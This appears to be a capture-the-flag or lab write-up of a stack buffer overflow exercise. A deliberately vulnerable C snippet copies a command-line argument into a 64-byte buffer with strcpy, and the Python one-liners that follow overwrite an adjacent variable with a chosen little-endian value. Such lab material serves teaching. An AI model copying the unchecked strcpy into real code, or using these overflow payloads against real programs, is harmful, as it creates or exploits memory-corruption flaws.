```C
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  printf("%s\n", BANNER);

  if (argc < 2) {
    errx(1, "specify an argument, to be copied into the \"buffer\"");
  }

  locals.changeme = 0;
  strcpy(locals.buffer, argv[1]);
```

This code and exploit is similar to the previous one, the difference being the code is getting the input from an argument instead of the get() function. We can overwrite locals.changeme this way :

```bash
$ ./code "$(python3 -c 'print("\x41"*64+"\x31")')"

Getting closer! changeme is currently 0x00000031, we want 0x496c5962
```

Now we need to write 0x496c5962. Memory being writen backwards the final exploit is :

```bash
$ ./code "$(python3 -c 'print("\x41"*64+"\x62\x59\x6c\x49")')"

Well done, you have successfully set changeme to the correct value
```
